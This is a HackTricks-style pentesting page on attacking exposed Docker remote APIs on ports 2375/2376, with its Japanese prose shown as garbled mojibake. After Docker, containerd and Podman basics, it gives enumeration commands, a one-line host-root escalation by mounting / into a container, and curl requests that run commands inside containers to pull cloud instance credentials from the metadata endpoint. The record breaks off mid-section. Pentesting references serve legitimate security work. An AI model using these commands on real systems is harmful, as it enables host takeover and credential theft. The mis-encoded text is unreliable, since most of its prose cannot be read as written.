# 2375, 2376 Dockerã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## Dockerã®åŸºç¤

### Dockerã¨ã¯

Dockerãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã¯ã€é€£ç¶šçš„ã§é«˜é€Ÿãªã‚¤ãƒãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿç¾ã™ã‚‹æ¥­ç•Œã‚’ãƒªãƒ¼ãƒ‰ã™ã‚‹ã‚³ãƒ³ãƒ†ãƒŠãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã‚ã‚Šã€çµ„ç¹”ãŒãƒ¬ã‚¬ã‚·ãƒ¼ã‹ã‚‰æ¬¡ã®ã‚‚ã®ã¾ã§ã€ã©ã‚“ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚‚ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ã«æ§‹ç¯‰ã—å…±æœ‰ã—ã€ã©ã“ã§ã‚‚å®‰å…¨ã«å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

### Dockerã®åŸºæœ¬çš„ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£

ã“ã®æƒ…å ±ã¯[ã“ã¡ã‚‰](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)ã‹ã‚‰å–å¾—ã—ã¾ã—ãŸã€‚

* [containerd](http://containerd.io)ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«å…¨ä½“ã‚’ç®¡ç†ã§ãã‚‹ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã§ã™ã€‚ã‚¤ãƒ¡ãƒ¼ã‚¸ã®è»¢é€/ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‹ã‚‰ã‚³ãƒ³ãƒ†ãƒŠã®å®Ÿè¡Œã€ç›£è¦–ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã¾ã§ã‚’æ‹…å½“ã—ã¾ã™ã€‚**containerdã«ã¤ã„ã¦ã®è©³ç´°ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**
* container-shimã¯ãƒ˜ãƒƒãƒ‰ãƒ¬ã‚¹ã‚³ãƒ³ãƒ†ãƒŠã‚’å‡¦ç†ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€runcãŒã‚³ãƒ³ãƒ†ãƒŠã‚’åˆæœŸåŒ–ã™ã‚‹ã¨ã€ã‚³ãƒ³ãƒ†ãƒŠã‚’ã‚³ãƒ³ãƒ†ãƒŠã‚·ãƒ ã«æ¸¡ã—ã¦ä¸­é–“äººã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚
* [runc](http://runc.io)ã¯ã€OCIä»•æ§˜ã«æº–æ‹ ã—ãŸè»½é‡ãªãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‚³ãƒ³ãƒ†ãƒŠã§ã™ã€‚**runcã¯ã€OCIä»•æ§˜ã«å¾“ã£ã¦ã‚³ãƒ³ãƒ†ãƒŠã‚’ç”ŸæˆãŠã‚ˆã³å®Ÿè¡Œã™ã‚‹ãŸã‚ã«containerdã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¾ã™**ã€‚ã¾ãŸã€libcontainerã®å†ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãƒ³ã‚°ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚
* [grpc](http://www.grpc.io)ã¯ã€containerdã¨docker-engineã®é–“ã®é€šä¿¡ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* [OCI](https://www.opencontainers.org)ã¯ã€ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã¨ã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãŸã‚ã®OCIä»•æ§˜ã‚’ç¶­æŒã—ã¦ã„ã¾ã™ã€‚ç¾åœ¨ã®Dockerã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯OCIã‚¤ãƒ¡ãƒ¼ã‚¸ã¨ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã®ä»•æ§˜ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### åŸºæœ¬çš„ãªã‚³ãƒãƒ³ãƒ‰
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

Containerdã¯ã€Dockerã‚„Kubernetesã ã‘ã§ãªãã€Linuxã€Windowsã€Solarisã€ãã®ä»–ã®OSä¸Šã§ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚„OSå›ºæœ‰ã®æ©Ÿèƒ½ã‚’æŠ½è±¡åŒ–ã™ã‚‹ã“ã¨ã‚’æœ›ã‚€ä»–ã®ã‚³ãƒ³ãƒ†ãƒŠãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã‚‚ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è€ƒæ…®ã—ã¦ã€containerdã«ã¯å¿…è¦ãªã‚‚ã®ã ã‘ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ä¸è¦ãªã‚‚ã®ã¯å«ã¾ã‚Œã¦ã„ã¾ã›ã‚“ã€‚ç¾å®Ÿçš„ã«ã¯ã“ã‚Œã¯ä¸å¯èƒ½ã§ã™ãŒã€å°‘ãªãã¨ã‚‚ãã‚Œã‚’ç›®æŒ‡ã—ã¦ã„ã¾ã™ã€‚ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ãªã©ã®æ©Ÿèƒ½ã¯containerdã®ç¯„å›²å¤–ã§ã™ã€‚ãã®ç†ç”±ã¯ã€åˆ†æ•£ã‚·ã‚¹ãƒ†ãƒ ã‚’æ§‹ç¯‰ã™ã‚‹éš›ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ãŒéå¸¸ã«é‡è¦ãªè¦ç´ ã§ã‚ã‚‹ãŸã‚ã§ã™ã€‚SDNã‚„ã‚µãƒ¼ãƒ“ã‚¹ãƒ‡ã‚£ã‚¹ã‚«ãƒãƒªã®ç¾åœ¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã¯Linuxä¸Šã®netlinkå‘¼ã³å‡ºã—ã‚’æŠ½è±¡åŒ–ã™ã‚‹ä»¥ä¸Šã«ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ å›ºæœ‰ã®ã‚‚ã®ã§ã™ã€‚

ãªãŠã€Dockerã¯Containerdã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ãŒã€Containerdã¯Dockerã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç®¡ç†æ©Ÿèƒ½ã‚’æŒã£ã¦ã„ãªã„ãŸã‚ã€Containerdå˜ä½“ã§ã¯Dockerã‚¹ãƒ¯ãƒ¼ãƒ ã‚’ä½œæˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**æƒ…å ±** [**ã“ã“ã‹ã‚‰**](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)

Podmanã¯ã€ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã§OCIï¼ˆOpen Container Initiativeï¼‰ã«æº–æ‹ ã—ãŸã‚³ãƒ³ãƒ†ãƒŠã‚¨ãƒ³ã‚¸ãƒ³ã§ã™ã€‚Red Hatã«ã‚ˆã£ã¦é–‹ç™ºã•ã‚Œã€Dockerã¨ã¯ç•°ãªã‚‹ã„ãã¤ã‹ã®ä¸»ãªé•ã„ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ‡ãƒ¼ãƒ¢ãƒ³ãƒ¬ã‚¹ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¨ãƒ«ãƒ¼ãƒˆãƒ¬ã‚¹ã‚³ãƒ³ãƒ†ãƒŠã®ã‚µãƒãƒ¼ãƒˆã§ã™ã€‚åŸºæœ¬çš„ã«ã¯ã€**ä¸¡æ–¹ã®ãƒ„ãƒ¼ãƒ«ã¯åŒã˜ã“ã¨ã‚’è¡Œã„ã¾ã™: ã‚¤ãƒ¡ãƒ¼ã‚¸ã¨ã‚³ãƒ³ãƒ†ãƒŠã®ç®¡ç†**ã€‚Podmanã®ç›®æ¨™ã®1ã¤ã¯ã€Dockeräº’æ›ã®APIã‚’æŒã¤ã“ã¨ã§ã™ã€‚ãã®ãŸã‚ã€Docker CLIã®ã»ã¨ã‚“ã©ã®CLIï¼ˆã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ï¼‰ã‚³ãƒãƒ³ãƒ‰ã¯ã€Podmanã§ã‚‚åˆ©ç”¨ã§ãã¾ã™ã€‚

Podmanã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ã¯ã€Buildahã¨Skopeoã¨ã„ã†2ã¤ã®ä»–ã®ãƒ„ãƒ¼ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚Buildahã¯ã€ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãƒ“ãƒ«ãƒ‰ã«ä½¿ç”¨ã•ã‚Œã‚‹CLIãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€Skopeoã¯ã€ãƒ—ãƒƒã‚·ãƒ¥ã€ãƒ—ãƒ«ã€ã¾ãŸã¯ã‚¤ãƒ³ã‚¹ãƒšã‚¯ãƒˆãªã©ã®ã‚¤ãƒ¡ãƒ¼ã‚¸æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹CLIãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ„ãƒ¼ãƒ«ã¨Podmanã®é–¢ä¿‚ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€[GitHubã‚’ã”è¦§ãã ã•ã„](https://github.com/containers/buildah/tree/master/docs/containertools)ã€‚

**ä¸»ãªé•ã„**

**Dockerã¨Podmanã®æœ€å¤§ã®é•ã„ã¯ã€ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§ã™**ã€‚**Docker**ã¯**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µãƒ¼ãƒãƒ¼ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£**ã§å‹•ä½œã—ã€**Podman**ã¯**ãƒ‡ãƒ¼ãƒ¢ãƒ³ãƒ¬ã‚¹ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£**ã§å‹•ä½œã—ã¾ã™ã€‚ã—ã‹ã—ã€ãã‚Œã¯ã©ã†ã„ã†æ„å‘³ã§ã—ã‚‡ã†ã‹ï¼Ÿ**Docker**ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€Docker CLIã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€Docker CLIã¯**ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ãƒ‡ãƒ¼ãƒ¢ãƒ³**ï¼ˆDockerãƒ‡ãƒ¼ãƒ¢ãƒ³ï¼‰ã¨é€šä¿¡ã—ã¾ã™ã€‚ãƒ¡ã‚¤ãƒ³ã®ãƒ­ã‚¸ãƒƒã‚¯ã¯ãƒ‡ãƒ¼ãƒ¢ãƒ³ã«ã‚ã‚Šã€ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ“ãƒ«ãƒ‰ã—ã€ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã®**ãƒ‡ãƒ¼ãƒ¢ãƒ³ã¯ãƒ«ãƒ¼ãƒˆæ¨©é™ã§å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚ä¸€æ–¹ã€**Podman**ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§ã¯ã€**ã‚³ãƒ³ãƒ†ãƒŠã‚’é–‹å§‹ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç‰¹æ¨©ã§ã‚³ãƒ³ãƒ†ãƒŠãŒå®Ÿè¡Œã•ã‚Œã¾ã™**ï¼ˆfork/execï¼‰ã€‚ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¯ãƒ«ãƒ¼ãƒˆæ¨©é™ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚**Podmanã¯ãƒ‡ãƒ¼ãƒ¢ãƒ³ãƒ¬ã‚¹ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã‚’æŒã¤ãŸã‚ã€Podmanã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è‡ªåˆ†è‡ªèº«ã®ã‚³ãƒ³ãƒ†ãƒŠã—ã‹è¦‹ã‚‹ã“ã¨ãŒã§ããšã€å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã›ã‚“**ã€‚CLIãƒ„ãƒ¼ãƒ«ãŒé€šä¿¡ã™ã‚‹å…±é€šã®ãƒ‡ãƒ¼ãƒ¢ãƒ³ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

Podmanã«ã¯ãƒ‡ãƒ¼ãƒ¢ãƒ³ãŒãªã„ãŸã‚ã€ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã§ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ãŒå¿…è¦ã§ã™ã€‚ãã®ãŸã‚ã€systemdã¨ã®çµ±åˆã‚’æä¾›ã—ã¦ãŠã‚Šã€systemdãƒ¦ãƒ‹ãƒƒãƒˆã‚’ä»‹ã—ã¦ã‚³ãƒ³ãƒ†ãƒŠã‚’åˆ¶å¾¡ã§ãã¾ã™ã€‚Podmanã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ˆã£ã¦ã¯ã€æ—¢å­˜ã®ã‚³ãƒ³ãƒ†ãƒŠç”¨ã®ãƒ¦ãƒ‹ãƒƒãƒˆã‚’ç”Ÿæˆã—ãŸã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ã«å­˜åœ¨ã—ãªã„å ´åˆã«ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã§ãã‚‹ãƒ¦ãƒ‹ãƒƒãƒˆã‚’ç”Ÿæˆã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚systemdã¨ã®ã‚‚ã†1ã¤ã®çµ±åˆãƒ¢ãƒ‡ãƒ«ã§ã¯ã€systemdã‚’ã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Dockerã¯ãƒ‡ãƒ¼ãƒ¢ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã«systemdã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

2ã¤ç›®ã®ä¸»ãªé•ã„ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠã®å®Ÿè¡Œæ–¹æ³•ã§ã™ã€‚**Podman**ã§ã¯ã€**ã‚³ãƒ³ãƒ†ãƒŠã¯ãƒ‡ãƒ¼ãƒ¢ãƒ³ã§ã¯ãªããƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç‰¹æ¨©ã§å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚ã“ã®æ™‚ç‚¹ã§ã€ãƒ«ãƒ¼ãƒˆãƒ¬ã‚¹ã‚³ãƒ³ãƒ†ãƒŠã®æ¦‚å¿µãŒç™»å ´ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€ã‚³ãƒ³ãƒ†ãƒŠã¯ãƒ«ãƒ¼ãƒˆæ¨©é™ãªã—ã§èµ·å‹•ã§ãã¾ã™ã€‚ãƒ«ãƒ¼ãƒˆãƒ¬ã‚¹ã‚³ãƒ³ãƒ†ãƒŠã¯ã€ãƒ«ãƒ¼ãƒˆæ¨©é™ã‚’æŒã¤ã‚³ãƒ³ãƒ†ãƒŠã¨æ¯”ã¹ã¦éå¸¸ã«å„ªã‚Œã¦ã„ã¾ã™ï¼ˆãŠå¯Ÿã—ã®é€šã‚Šï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ãŒã‚³ãƒ³ãƒ†ãƒŠã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¦è„±å‡ºã§ããŸå ´åˆã§ã‚‚ã€ã“ã®æ”»æ’ƒè€…ã¯ãƒ›ã‚¹ãƒˆä¸Šã®é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦é–‹å§‹ã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒŠã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼è‡ªä½“ã‚ˆã‚Šã‚‚å¤šãã®ç‰¹æ¨©ã‚„æ©Ÿèƒ½ã‚’æŒã¤ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€è‡ªç„¶ãªä¿è­·å±¤ãŒè¿½åŠ ã•ã‚Œã¾ã™ã€‚

{% hint style="info" %}
Podmanã¯Dockerã¨åŒã˜APIã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ã‚’ç›®æŒ‡ã—ã¦ã„ã‚‹ãŸã‚ã€dockerã¨åŒã˜ã‚³ãƒãƒ³ãƒ‰ã‚’podmanã§ã‚‚ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## åŸºæœ¬æƒ…å ±

ãƒªãƒ¢ãƒ¼ãƒˆAPIã¯ã€æœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã«ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒãƒ¼ãƒˆ2375ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯èªè¨¼ãŒå¿…è¦ãªãã€æ”»æ’ƒè€…ã¯ç‰¹æ¨©ã®ã‚ã‚‹Dockerã‚³ãƒ³ãƒ†ãƒŠã‚’èµ·å‹•ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒªãƒ¢ãƒ¼ãƒˆAPIã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒ›ã‚¹ãƒˆ/ï¼ˆãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼‰ã‚’ã‚³ãƒ³ãƒ†ãƒŠã«ã‚¢ã‚¿ãƒƒãƒã—ã€ãƒ›ã‚¹ãƒˆç’°å¢ƒã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿æ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆï¼š** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## åˆ—æŒ™

### æ‰‹å‹•

Docker APIã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ä¾‹ã®ã‚ˆã†ã«`docker`ã‚³ãƒãƒ³ãƒ‰ã¾ãŸã¯`curl`ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
ã‚‚ã—`docker`ã‚³ãƒãƒ³ãƒ‰ã§**ãƒªãƒ¢ãƒ¼ãƒˆã®Docker APIã«æ¥ç¶š**ã§ãã‚‹å ´åˆã€ã‚µãƒ¼ãƒ“ã‚¹ã¨ã®ã‚„ã‚Šå–ã‚Šã«ã¯[**ä»¥å‰ã‚³ãƒ¡ãƒ³ãƒˆã•ã‚ŒãŸ**dockerã‚³ãƒãƒ³ãƒ‰](2375-pentesting-docker.md#basic-commands)ã®ã„ãšã‚Œã‹ã‚’**å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="info" %}
`export DOCKER_HOST="tcp://localhost:2375"`ã‚’ä½¿ç”¨ã—ã¦ã€dockerã‚³ãƒãƒ³ãƒ‰ã§`-H`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**ä½¿ç”¨ã—ãªã„**ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
{% endhint %}

#### è¿…é€Ÿãªç‰¹æ¨©ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

æ™‚ã€…ã€**TLS**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®**2376**ãŒåˆ©ç”¨å¯èƒ½ã«ãªã£ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ç§ã¯dockerã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§æ¥ç¶šã™ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã§ã—ãŸãŒã€curlã‚’ä½¿ç”¨ã—ã¦docker APIã«å•é¡Œãªãã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
